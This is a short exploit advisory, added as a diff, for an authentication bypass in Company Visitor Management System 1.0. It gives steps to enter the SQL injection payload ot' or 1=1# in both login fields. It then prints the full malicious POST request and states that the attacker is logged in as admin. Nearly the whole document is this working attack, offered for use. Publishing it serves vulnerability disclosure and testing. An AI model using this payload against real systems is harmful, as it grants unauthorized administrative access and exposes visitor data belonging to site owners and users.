@@ -1,0 +1,31 @@
+# Exploit Title: Company Visitor Management System (CVMS) 1.0 - Authentication Bypass
+# Date: 16/10/2020
+# Exploit Author: Oğuz Türkgenç
+# Vendor Homepage: https://phpgurukul.com/company-visitor-management-system-using-php-and-mysql/
+# Software Link: https://phpgurukul.com/?smd_process_download=1&download_id=9602
+# Version: 1.0
+# Tested On: Windows 7 Enterprise SP1 + XAMPP V3.2.3
+
+Step 1: Open the URL http://localhost/cvms/index.php
+
+Step 2: use payload ot' or 1=1# in user and password field
+
+Malicious Request
+
+POST /cvms/index.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.175.128/cvms/index.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+Origin: http://localhost
+Connection: close
+Cookie: lang=english; PHPSESSID=qkg4nmdq97r4jkvkm4raa34660
+Upgrade-Insecure-Requests: 1
+
+username=ot%27+or+1%3D1+%23&password=ot%27+or+1%3D1+%23&login=
+
+Step 3: You will be logged in as admin.
